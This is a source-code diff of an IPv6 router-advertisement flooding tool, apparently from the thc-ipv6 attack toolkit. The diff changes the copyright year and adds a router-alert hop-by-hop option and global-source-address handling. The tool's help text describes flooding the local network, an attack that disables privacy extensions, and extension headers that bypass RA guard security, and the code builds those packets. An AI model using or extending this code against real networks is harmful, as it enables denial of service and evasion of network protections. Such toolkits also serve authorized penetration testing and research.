@@ -11,7 +11,7 @@
 #include "thc-ipv6.h"
 
 void help(char *prg) {
-  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("%s %s (c) 2014 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
   printf("Syntax: %s [-HFD] [-sSG] [-RPA] interface [target]\n\n", prg);
   printf("Flood the local network with router advertisements.\n");
   printf("Each packet contains ~25 prefix and route enries\n");
@@ -21,6 +21,7 @@ void help(char *prg) {
   printf("  -P       does only send prefix information, no routing entries\n");
   printf("  -A       an attack to disable privacy extensions\n");
   printf("Options:\n");
+  printf("  -a       add a hopbyhop header with router alert\n");
   printf("  -H       add a hopbyhop header to bypass RA guard security\n");
   printf("  -F       add an atomic fragment header to bypass RA guard security\n");
   printf("  -D       add a large destination header to bypass RA guard security\n");
@@ -37,14 +38,14 @@ int main(int argc, char *argv[]) {
   unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst);
   int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0, offset = 14;
   unsigned char *pkt = NULL;
-  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_hop = 0, do_frag = 0, do_dst = 0, bsize = -1;
-  int cnt, until = 0, lifetime = 0x00ff0100, mfoo, slow = 0;
+  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_alert = 0, do_hop = 0, do_frag = 0, do_dst = 0, bsize = -1;
+  int cnt, until = 0, lifetime = 0x00ff0100, mfoo, slow = 0, prefer = PREFER_LINK;
   thc_ipv6_hdr *hdr = NULL;
 
   if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
-  while ((i = getopt(argc, argv, "DFHRPArsSG")) >= 0) {
+  while ((i = getopt(argc, argv, "DFHRPAarsSG")) >= 0) {
     switch (i) {
     case 'r':
       thc_ipv6_rawmode(1);
@@ -71,6 +72,10 @@ int main(int argc, char *argv[]) {
     case 'H':
       do_hop = 1;
       break;
+    case 'a':
+      do_alert = 1;
+      do_hop = 1;
+      break;
     case 'D':
       do_dst = 1;
       break;
@@ -86,24 +91,31 @@ int main(int argc, char *argv[]) {
     }
   }
   
+  interface = argv[optind];
+  
   if (prefix_only && route_only) {
     fprintf(stderr, "Error: -P/-A and -R can not be specified together!\n");
     exit(-1);
   }
   
   if (bsize == -1) {
-    bsize = thc_get_mtu(argv[optind]) - 40;
+    bsize = thc_get_mtu(interface) - 40;
     if (bsize < 1240 || bsize > 1460) {
-      fprintf(stderr, "Error: invalid MTU on interface %s: %d\n", argv[optind], thc_get_mtu(argv[optind]));
+      fprintf(stderr, "Error: invalid MTU on interface %s: %d\n", interface, thc_get_mtu(interface));
       exit(-1);
     }
   }
   
-  if (argc - optind > 1)
+  if (argc - optind > 1) {
     if ((dst = thc_resolve6(argv[optind + 1])) == NULL) {
       fprintf(stderr, "Error: invalid target %s\n", argv[optind + 1]);
       exit(-1);
     }
+    if (dst[0] >= 0x20 && dst[0] <= 0xfd) {
+      prefer = PREFER_GLOBAL;
+      ip6 = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL);
+    }
+  }
 
   if ((buf = malloc(bsize)) == NULL) {
     fprintf(stderr, "Error: malloc() failed\n");
@@ -126,7 +138,6 @@ int main(int argc, char *argv[]) {
   srand(time(NULL) + getpid());
   setvbuf(stdout, NULL, _IONBF, 0);
 
-  interface = argv[optind];
   if (thc_get_own_mac(interface) == NULL) {
     fprintf(stderr, "Error: invalid interface %s\n", interface);
     exit(-1);
@@ -134,10 +145,14 @@ int main(int argc, char *argv[]) {
   mtu = 1500;
   size = 64;
   k = rand();
-  ip6 = malloc(16);
-  memset(ip6, 0, 16);
-  ip6[0] = 254;
-  ip6[1] = 128;
+  if (prefer == PREFER_LINK) {
+    ip6 = malloc(16);
+    memset(ip6, 0, 16);
+    ip6[0] = 0xfe;
+    ip6[1] = 0x80;
+  } else {
+    memset(ip6 + 8, 0, 8);
+  }
   ip6[9] = ( k % 65536) / 256;
   ip6[10] = k % 256;
   ip6[15] = 1;
@@ -148,7 +163,7 @@ int main(int argc, char *argv[]) {
   memset(buf2, 0, sizeof(buf2));
   memset(buf3, 0, sizeof(buf3));
   memset(buf, 0, bsize);
-  buf[1] = 250;
+  buf[1] = 0x30;
   buf[5] = 30;
   buf[8] = 5; // mtu
   buf[9] = 1;
@@ -201,6 +216,11 @@ int main(int argc, char *argv[]) {
       j += 24;
       k++;
     }
+  }
+  
+  if (do_alert) {
+    buf2[0] = 5;
+    buf2[1] = 2;
   }
   
 //printf("DBG: %d entries of %s %s\n", cnt, route_only == 0 ? "prefix" : "", prefix_only == 0 ? "route" : "");
